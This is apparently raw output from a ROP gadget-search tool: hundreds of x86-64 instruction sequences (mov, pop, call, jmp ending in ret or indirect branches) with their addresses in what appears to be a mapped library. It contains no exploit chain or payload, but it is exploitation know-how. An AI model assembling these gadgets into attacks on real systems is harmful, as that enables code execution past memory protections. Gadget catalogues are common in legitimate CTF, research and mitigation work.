0x00002aaaaab01b2c : mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaabbbf17 : mov rax, qword ptr [rdx] ; mov qword ptr [rdx], rdi ; ret
0x00002aaaaab51840 : mov rax, qword ptr [rdx] ; test rax, rax ; jne 0x7c841 ; ret
0x00002aaaaac15333 : mov rax, qword ptr [rip + 0x2840d6] ; call qword ptr [rax]
0x00002aaaaac14d20 : mov rax, qword ptr [rip + 0x2846e9] ; call qword ptr [rax]
0x00002aaaaac0c790 : mov rax, qword ptr [rip + 0x28b701] ; add rsp, 8 ; ret
0x00002aaaaac0c760 : mov rax, qword ptr [rip + 0x28b799] ; add rsp, 8 ; ret
0x00002aaaaac0c700 : mov rax, qword ptr [rip + 0x28b881] ; add rsp, 8 ; ret
0x00002aaaaac0c730 : mov rax, qword ptr [rip + 0x28b8a9] ; add rsp, 8 ; ret
0x00002aaaaabfce00 : mov rax, qword ptr [rip + 0x29b1e1] ; mov rax, qword ptr fs:[rax] ; ret
0x00002aaaaabf53e0 : mov rax, qword ptr [rip + 0x2a4491] ; ret
0x00002aaaaabde750 : mov rax, qword ptr [rip + 0x2b9719] ; mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaab5855e : mov rax, qword ptr [rip + 0x33f97b] ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab56164 : mov rax, qword ptr [rip + 0x341c65] ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab55f3f : mov rax, qword ptr [rip + 0x341e8a] ; mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaab51b10 : mov rax, qword ptr [rip + 0x347a09] ; ret
0x00002aaaaab029cb : mov rax, qword ptr [rip + 0x39541e] ; mov qword ptr [rax], rdx ; ret
0x00002aaaaaafec90 : mov rax, qword ptr [rip + 0x39ac59] ; ret
0x00002aaaaaaf6a50 : mov rax, qword ptr [rip + 0x3a68b9] ; ret
0x00002aaaaaaf6a40 : mov rax, qword ptr [rip + 0x3a68d9] ; ret
0x00002aaaaab030b0 : mov rax, qword ptr [rsi + 0x70] ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab030c0 : mov rax, qword ptr [rsi + 0x78] ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab01b48 : mov rax, qword ptr [rsi + rax*8 + 0x80] ; ret
0x00002aaaaab1d38b : mov rax, qword ptr [rsi + rbx*8] ; lea r9, qword ptr [rdx] ; jmp 0x483eb
0x00002aaaaab1ef6b : mov rax, qword ptr [rsi + rbx*8] ; lea r9, qword ptr [rdx] ; jmp 0x49fcb
0x00002aaaaab0b554 : mov rax, qword ptr [rsi] ; and rax, qword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab0b844 : mov rax, qword ptr [rsi] ; or rax, qword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab9cf5d : mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaaaf5829 : mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaabc4456 : mov rax, qword ptr [rsp + 0x18] ; mov rdx, rax ; jmp 0xef49a
0x00002aaaaaaf9369 : mov rax, qword ptr [rsp + 0x28] ; call rax
0x00002aaaaaaf9d04 : mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaab0dfe6 : mov rax, qword ptr [rsp + 0x30] ; lea r15, qword ptr [rbx + r14] ; call rax
0x00002aaaaac17a96 : mov rax, qword ptr [rsp + 0x38] ; jne 0x142a83 ; add rsp, 0x48 ; ret
0x00002aaaaab8e453 : mov rax, qword ptr [rsp + 8] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab10038 : mov rax, qword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaabd225f : mov rax, qword ptr [rsp - 0x50] ; ret
0x00002aaaaac07b67 : mov rax, qword ptr [rsp] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabde7b2 : mov rax, qword ptr [rsp] ; add rsp, 0x38 ; ret
0x00002aaaaabde813 : mov rax, qword ptr [rsp] ; add rsp, 0x40 ; ret
0x00002aaaaab02eca : mov rax, qword ptr fs:[rax] ; movzx eax, word ptr [rax + rdi*2] ; and eax, 1 ; ret
0x00002aaaaabfce07 : mov rax, qword ptr fs:[rax] ; ret
0x00002aaaaac0c648 : mov rax, qword ptr fs:[rbx] ; test rax, rax ; je 0x137662 ; pop rbx ; ret
0x00002aaaaab6a598 : mov rax, r11 ; jmp 0x953f4
0x00002aaaaab693d9 : mov rax, r11 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab634eb : mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab41479 : mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab437da : mov rax, r13 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4857a : mov rax, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab432b4 : mov rax, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab5b3c1 : mov rax, r14 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5763c : mov rax, r8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1f806 : mov rax, r8 ; pop rbx ; ret
0x00002aaaaab52f36 : mov rax, r8 ; ret
0x00002aaaaab4e129 : mov rax, rbp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab43ff8 : mov rax, rbp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4adf3 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab43fcb : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab42b95 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab731d0 : mov rax, rbp ; pop rbx ; pop rbp ; ret
0x00002aaaaab44661 : mov rax, rbx ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4ea9c : mov rax, rbx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1f690 : mov rax, rbx ; add rsp, 0x440 ; pop rbx ; ret
0x00002aaaaab692c6 : mov rax, rbx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9d573 : mov rax, rbx ; call rax
0x00002aaaaab3fc43 : mov rax, rbx ; je 0x6ac6b ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda23e : mov rax, rbx ; mov byte ptr [rdx], 0 ; pop rbx ; ret
0x00002aaaaab4597e : mov rax, rbx ; mov dword ptr [rbp], r12d ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab08c38 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaff835 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab42fe9 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab076aa : mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0faae : mov rax, rbx ; pop rbx ; ret
0x00002aaaaabd6409 : mov rax, rbx ; pop rdx ; pop rbx ; ret
0x00002aaaaab0f68b : mov rax, rcx ; or rax, rdx ; ret
0x00002aaaaab5beac : mov rax, rcx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5bf19 : mov rax, rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab08ea6 : mov rax, rcx ; ret
0x00002aaaaabea880 : mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaab0f6a0 : mov rax, rdi ; cqo ; idiv rsi ; ret
0x00002aaaaab72e66 : mov rax, rdi ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab73964 : mov rax, rdi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab6b7a9 : mov rax, rdi ; pop rbx ; ret
0x00002aaaaab1f60d : mov rax, rdi ; ret
0x00002aaaaabed4a9 : mov rax, rdi ; sar rax, 6 ; ret
0x00002aaaaab5a38f : mov rax, rdx ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8fcd7 : mov rax, rdx ; add rsp, 0x18 ; ret
0x00002aaaaab5863c : mov rax, rdx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab52724 : mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaab6bdb5 : mov rax, rdx ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaabe2f7b : mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab58ff6 : mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab52b2b : mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaab1e0b4 : mov rax, rdx ; pop rbx ; ret
0x00002aaaaab1d4c9 : mov rax, rdx ; ret
0x00002aaaaab9dbb4 : mov rax, rsi ; add rsp, 8 ; ret
0x00002aaaaab1f5bd : mov rax, rsi ; cmovae rax, rdi ; ret
0x00002aaaaab44c83 : mov rax, rsi ; pop rbp ; pop r12 ; ret
0x00002aaaaab9c952 : mov rax, rsi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab44a17 : mov rax, rsi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f1d3 : mov rax, rsi ; pop rbx ; pop rbp ; ret
0x00002aaaaabf1251 : mov rax, rsi ; pop rbx ; ret
0x00002aaaaab1f6f3 : mov rax, rsi ; ret
0x00002aaaaac46f0a : mov rax, rsi ; sub rax, rdx ; vzeroupper ; ret
0x00002aaaaab0a2ec : mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaab5aefe : mov rbp, rax ; call 0x82185
0x00002aaaaabd6c46 : mov rbp, rax ; call rax
0x00002aaaaabd79ee : mov rbp, rdi ; xor edx, edx ; xor esi, esi ; mov rbx, rax ; call rax
0x00002aaaaabe9de3 : mov rbp, rsp ; pop rbp ; ret
0x00002aaaaabe97f1 : mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaac4867e : mov rbx, qword ptr [rdi + 0x10] ; call 0x1f8ae
0x00002aaaaac4867d : mov rbx, qword ptr [rdi + 0x10] ; call 0x1f8af
0x00002aaaaabd79f5 : mov rbx, rax ; call rax
0x00002aaaaac026ba : mov rbx, rax ; jne 0x12d65a ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd0ea6 : mov rbx, rax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab0c306 : mov rbx, rax ; mov rdi, r12 ; call r15
0x00002aaaaab01375 : mov rbx, rdi ; test rax, rax ; je 0x2c387 ; call rax
0x00002aaaaabd6c3e : mov rbx, rdi ; xor esi, esi ; mov r12d, edx ; mov rbp, rax ; call rax
0x00002aaaaabe2444 : mov rbx, rdx ; jmp 0x10d371
0x00002aaaaab9ec04 : mov rbx, rdx ; jmp 0xc9ad9
0x00002aaaaac00345 : mov rbx, rsi ; sub rsp, 8 ; call 0x137649
0x00002aaaaab0038f : mov rcx, qword ptr [rax + r15*8] ; test rcx, rcx ; je 0x2b3a3 ; call rcx
0x00002aaaaabffba6 : mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab73fd9 : mov rcx, qword ptr [rcx - 8] ; mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x00002aaaaac43e16 : mov rcx, qword ptr [rsi - 8] ; cmp rcx, rax ; jne 0x16ee4e ; xor eax, eax ; ret
0x00002aaaaac44c56 : mov rcx, qword ptr [rsi - 8] ; cmp rcx, rax ; jne 0x16fc8e ; xor eax, eax ; ret
0x00002aaaaab7a200 : mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2fa04 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f994 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f924 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f8b4 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f844 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f7d4 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f764 : mov rcx, qword ptr [rsi] ; mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac09fcc : mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaac06b94 : mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac0c26d : mov rcx, qword ptr [rsp + 0x18] ; lea r9, qword ptr [rsp + 0x3a] ; call qword ptr [rax]
0x00002aaaaac0699c : mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaac0192c : mov rcx, qword ptr [rsp + 8] ; call rcx
0x00002aaaaabec188 : mov rcx, r12 ; mov rsi, r12 ; call 0x73448
0x00002aaaaabfee30 : mov rcx, r13 ; call rbx
0x00002aaaaab4a290 : mov rcx, r13 ; mov rdi, r15 ; xor r8d, r8d ; call rbx
0x00002aaaaab81ab9 : mov rcx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaabfe6bc : mov rcx, r14 ; mov rdi, r13 ; call r12
0x00002aaaaab73183 : mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaab73195 : mov rcx, rax ; xor eax, eax ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaac0036b : mov rcx, rbx ; add rdi, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac22080 : mov rcx, rdx ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac22083 : mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaabd719f : mov rdi, qword ptr [r12] ; call rbx
0x00002aaaaac485e9 : mov rdi, qword ptr [r13 + 0x20] ; call 0x1f8ae
0x00002aaaaac485e0 : mov rdi, qword ptr [r13 + 0x70] ; call 0x1f8ae
0x00002aaaaac485fa : mov rdi, qword ptr [r13] ; call 0x1f8ae
0x00002aaaaab0df6c : mov rdi, qword ptr [r13] ; call r14
0x00002aaaaabd6da9 : mov rdi, qword ptr [r13] ; call rbx
0x00002aaaaabd6d16 : mov rdi, qword ptr [r14] ; call rbx
0x00002aaaaabd6d57 : mov rdi, qword ptr [r15] ; call rbx
0x00002aaaaab096bc : mov rdi, qword ptr [rax + 0x28] ; call 0x1f8b2
0x00002aaaaab8f470 : mov rdi, qword ptr [rax] ; call r14
0x00002aaaaabd7152 : mov rdi, qword ptr [rax] ; mov qword ptr [rsp + 8], rax ; call rbx
0x00002aaaaac08658 : mov rdi, qword ptr [rbp + 0x20] ; test rdi, rdi ; je 0x133679 ; call 0x1f8b3
0x00002aaaaaba3754 : mov rdi, qword ptr [rbp - 0x308] ; call r12
0x00002aaaaabd75e4 : mov rdi, qword ptr [rbp - 0x40] ; mov r13d, ebx ; mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaab2b4ad : mov rdi, qword ptr [rbp - 0x4a8] ; call rax
0x00002aaaaaba142d : mov rdi, qword ptr [rbp - 0x58] ; call 0x1f8b2
0x00002aaaaabc006f : mov rdi, qword ptr [rbp - 0x88] ; call rbx
0x00002aaaaab80f54 : mov rdi, qword ptr [rbp] ; call r12
0x00002aaaaabd6ede : mov rdi, qword ptr [rbp] ; call rbx
0x00002aaaaabf418c : mov rdi, qword ptr [rbx + 0x48] ; test rdi, rdi ; jne 0x11f18a ; pop rbx ; ret
0x00002aaaaac485bc : mov rdi, qword ptr [rbx] ; call 0x1f8ad
0x00002aaaaac008b3 : mov rdi, qword ptr [rbx] ; mov rax, qword ptr [rdi + 8] ; push 0 ; push 0x19 ; call qword ptr [rax]
0x00002aaaaac07450 : mov rdi, qword ptr [rdi + 0x40] ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x13246a ; ret
0x00002aaaaac0d5b0 : mov rdi, qword ptr [rdi + 0x40] ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x1385ca ; ret
0x00002aaaaab1cbb9 : mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
0x00002aaaaab42dd5 : mov rdi, qword ptr [rdi + 0xe0] ; call rax
0x00002aaaaab42d99 : mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
0x00002aaaaab47fe7 : mov rdi, qword ptr [rdx + 0x40] ; jmp 0x72fb5
0x00002aaaaabe7733 : mov rdi, qword ptr [rdx + 0x50] ; mov rsi, rdx ; call rax
0x00002aaaaabd723e : mov rdi, qword ptr [rsp + 0x10] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaaaf9070 : mov rdi, qword ptr [rsp + 0x18] ; call r12
0x00002aaaaab9d6fe : mov rdi, qword ptr [rsp + 0x18] ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaaaf9364 : mov rdi, qword ptr [rsp + 0x18] ; mov rax, qword ptr [rsp + 0x28] ; call rax
0x00002aaaaaaf9cff : mov rdi, qword ptr [rsp + 0x18] ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaaafdab9 : mov rdi, qword ptr [rsp + 0x20] ; call r14
0x00002aaaaaaf8e50 : mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaaafa10d : mov rdi, qword ptr [rsp + 0x20] ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaaaf9804 : mov rdi, qword ptr [rsp + 0x30] ; call r12
0x00002aaaaaafa58f : mov rdi, qword ptr [rsp + 0x30] ; call r14
0x00002aaaaaafa34f : mov rdi, qword ptr [rsp + 0x30] ; call r15
0x00002aaaaaaf98b8 : mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00002aaaaaafd2ae : mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00002aaaaaafab57 : mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00002aaaaaafd047 : mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaaafaf2e : mov rdi, qword ptr [rsp + 0x38] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaaafb867 : mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00002aaaaaafbca7 : mov rdi, qword ptr [rsp + 0x40] ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaabc85cb : mov rdi, qword ptr [rsp + 0x48] ; mov qword ptr [r14], rbx ; call 0x1f8b2
0x00002aaaaac01948 : mov rdi, qword ptr [rsp + 0x60] ; call rax
0x00002aaaaab901ff : mov rdi, qword ptr [rsp + 0x68] ; call r12
0x00002aaaaac1792a : mov rdi, qword ptr [rsp] ; mov rax, qword ptr [rax + 0x128] ; jmp rax
0x00002aaaaac0f9fe : mov rdi, r12 ; call qword ptr [rax]
0x00002aaaaab0c309 : mov rdi, r12 ; call r15
0x00002aaaaac0705c : mov rdi, r12 ; call rax
0x00002aaaaab49fe8 : mov rdi, r12 ; call rbx
0x00002aaaaab81d69 : mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaab5d2a5 : mov rdi, r12 ; mov rdx, r13 ; mov rsi, rbp ; call rax
0x00002aaaaabf436d : mov rdi, r13 ; call r12
0x00002aaaaab0e1ab : mov rdi, r13 ; call r14
0x00002aaaaabf1304 : mov rdi, r13 ; call rax
0x00002aaaaabd7a3f : mov rdi, r13 ; call rbx
0x00002aaaaab0c8b3 : mov rdi, r13 ; mov rdx, rbp ; call r15
0x00002aaaaac48607 : mov rdi, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp 0x1f8b3
0x00002aaaaab55f46 : mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaac016c7 : mov rdi, r14 ; call rax
0x00002aaaaabd7a63 : mov rdi, r14 ; call rbx
0x00002aaaaac00de2 : mov rdi, r14 ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaac01929 : mov rdi, r14 ; mov rcx, qword ptr [rsp + 8] ; call rcx
0x00002aaaaab3ad5c : mov rdi, r15 ; call 0x71fd5
0x00002aaaaab3410e : mov rdi, r15 ; call 0x7b3a5
0x00002aaaaab48ed4 : mov rdi, r15 ; call qword ptr [rax + 0x80]
0x00002aaaaac0cdef : mov rdi, r15 ; call qword ptr [rax]
0x00002aaaaac0ec7d : mov rdi, r15 ; call r14
0x00002aaaaab49014 : mov rdi, r15 ; call rax
0x00002aaaaabd7a83 : mov rdi, r15 ; call rbx
0x00002aaaaac0c4ae : mov rdi, r15 ; lea r9, qword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaab55d0b : mov rdi, r15 ; mov qword ptr [rsp + 0x20], r10 ; call qword ptr [rax]
0x00002aaaaab4a293 : mov rdi, r15 ; xor r8d, r8d ; call rbx
0x00002aaaaab5d6b7 : mov rdi, r9 ; mov qword ptr [rbx], rsi ; mov qword ptr [rbx + 0x48], r9 ; call rcx
0x00002aaaaac0b213 : mov rdi, rax ; call qword ptr [r10]
0x00002aaaaabc1279 : mov rdi, rax ; call rbx
0x00002aaaaab5bbf9 : mov rdi, rax ; call rcx
0x00002aaaaac0b305 : mov rdi, rax ; lea r9, qword ptr [rsp + 0x10] ; call qword ptr [r10]
0x00002aaaaac0b116 : mov rdi, rax ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [r10]
0x00002aaaaab1f6ec : mov rdi, rax ; mov byte ptr [rsi], dl ; jne 0x4a6e2 ; mov rax, rsi ; ret
0x00002aaaaab5aefb : mov rdi, rax ; mov rbp, rax ; call 0x82188
0x00002aaaaabffba3 : mov rdi, rax ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab5af87 : mov rdi, rax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaac0eb9a : mov rdi, rbp ; add rbx, r12 ; call r14
0x00002aaaaac46f7b : mov rdi, rbp ; add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaabc8454 : mov rdi, rbp ; call 0xef755
0x00002aaaaac0275d : mov rdi, rbp ; call qword ptr [rbx]
0x00002aaaaac104ca : mov rdi, rbp ; call r12
0x00002aaaaac0043c : mov rdi, rbp ; call r14
0x00002aaaaab0c346 : mov rdi, rbp ; call r15
0x00002aaaaab59405 : mov rdi, rbp ; call rax
0x00002aaaaab816e5 : mov rdi, rbp ; call rbx
0x00002aaaaac103a0 : mov rdi, rbp ; call rcx
0x00002aaaaac02254 : mov rdi, rbp ; call rdx
0x00002aaaaac00ed4 : mov rdi, rbp ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac0f899 : mov rdi, rbp ; mov edx, 0xffffffff ; xor eax, eax ; call r8
0x00002aaaaac0f8e3 : mov rdi, rbp ; mov edx, 0xffffffff ; xor eax, eax ; call rcx
0x00002aaaaac09fc9 : mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaac06b91 : mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac06999 : mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaabfee2d : mov rdi, rbp ; mov rcx, r13 ; call rbx
0x00002aaaaab59e12 : mov rdi, rbp ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac01b5c : mov rdi, rbp ; xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaabc8591 : mov rdi, rbx ; call 0x1f7f5
0x00002aaaaabc40f5 : mov rdi, rbx ; call 0x3b3c5
0x00002aaaaab91e7a : mov rdi, rbx ; call 0x89165
0x00002aaaaab938fa : mov rdi, rbx ; call 0x8ab75
0x00002aaaaaba2f14 : mov rdi, rbx ; call qword ptr [r15]
0x00002aaaaac02b87 : mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaaafec46 : mov rdi, rbx ; call r12
0x00002aaaaaaf6bdf : mov rdi, rbx ; call r14
0x00002aaaaab41b48 : mov rdi, rbx ; call r8
0x00002aaaaabf3eb9 : mov rdi, rbx ; call rax
0x00002aaaaac484fa : mov rdi, rbx ; jne 0x1734f1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabfe91f : mov rdi, rbx ; mov qword ptr [rsp], rcx ; call r12
0x00002aaaaabfea21 : mov rdi, rbx ; mov r13, rsp ; call r15
0x00002aaaaaaf72bd : mov rdi, rbx ; mov rax, qword ptr [rbp - 0x58] ; call rax
0x00002aaaaab9cf5a : mov rdi, rbx ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaabec185 : mov rdi, rbx ; mov rcx, r12 ; mov rsi, r12 ; call 0x7344b
0x00002aaaaab5c555 : mov rdi, rbx ; mov rdx, r15 ; call rax
0x00002aaaaab528c1 : mov rdi, rbx ; neg rdi ; call qword ptr [r15]
0x00002aaaaab4721d : mov rdi, rbx ; pop rbx ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47065 : mov rdi, rbx ; pop rbx ; mov rax, qword ptr [rax + 0x28] ; jmp rax
0x00002aaaaac0ed1f : mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac48687 : mov rdi, rbx ; test rdi, rdi ; jne 0x173683 ; pop rbx ; ret
0x00002aaaaabc8655 : mov rdi, rcx ; call 0x1f8ad
0x00002aaaaabc85e7 : mov rdi, rdx ; call 0x1f8ad
0x00002aaaaabe95b7 : mov rdi, rdx ; jmp rax
0x00002aaaaab1f770 : mov rdi, rdx ; mov byte ptr [rsi], al ; jne 0x4a75a ; mov rax, rsi ; ret
0x00002aaaaac08532 : mov rdi, rsp ; call 0x1f7e5
0x00002aaaaabffc95 : mov rdi, rsp ; call rax
0x00002aaaaac0ed90 : mov rdi, rsp ; call rdx
0x00002aaaaabfe5ed : mov rdi, rsp ; mov rsi, r14 ; call 0x558b8
0x00002aaaaab02903 : mov rdx, -1 ; cmove rax, rdx ; ret
0x00002aaaaab4900d : mov rdx, qword ptr [r15 + 0x40] ; sub rdx, rsi ; mov rdi, r15 ; call rax
0x00002aaaaab1d02f : mov rdx, qword ptr [r8 + rax*8] ; mov qword ptr [rsi + rax*8], rdx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4c464 : mov rdx, qword ptr [rax + 0x18] ; mov qword ptr [rax + 0x20], rdx ; pop rbx ; ret
0x00002aaaaaba093b : mov rdx, qword ptr [rax + 0x18] ; test rdx, rdx ; je 0xcb952 ; call rdx
0x00002aaaaaaf5826 : mov rdx, qword ptr [rax] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaab4d76f : mov rdx, qword ptr [rbx + 0x40] ; sub rdx, rsi ; mov rdi, rbx ; call rax
0x00002aaaaabe95b0 : mov rdx, qword ptr [rdi + 8] ; mov rax, qword ptr [rdi] ; mov rdi, rdx ; jmp rax
0x00002aaaaab5dac4 : mov rdx, qword ptr [rdx + 8] ; test rdx, rdx ; jne 0x88aca ; ret
0x00002aaaaac4826f : mov rdx, qword ptr [rdx + rbp*8] ; test rdx, rdx ; je 0x173283 ; call rdx
0x00002aaaaab5d9d8 : mov rdx, qword ptr [rip + 0x33a579] ; mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaab03194 : mov rdx, qword ptr [rip + 0x394d95] ; mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaabcacd6 : mov rdx, qword ptr [rsi + 0x78] ; mov qword ptr [rdi + 0x100], rdx ; ret
0x00002aaaaabca339 : mov rdx, qword ptr [rsi + 0x78] ; mov qword ptr [rdi + 0x80], rdx ; ret
0x00002aaaaab7a243 : mov rdx, qword ptr [rsi + 5] ; mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7a253 : mov rdx, qword ptr [rsi + 6] ; mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7a263 : mov rdx, qword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; ret
0x00002aaaaac26e30 : mov rdx, qword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab7b800 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7c630 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7a1f0 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab7e0a0 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; xor ch, ch ; mov byte ptr [rdi + 8], ch ; ret
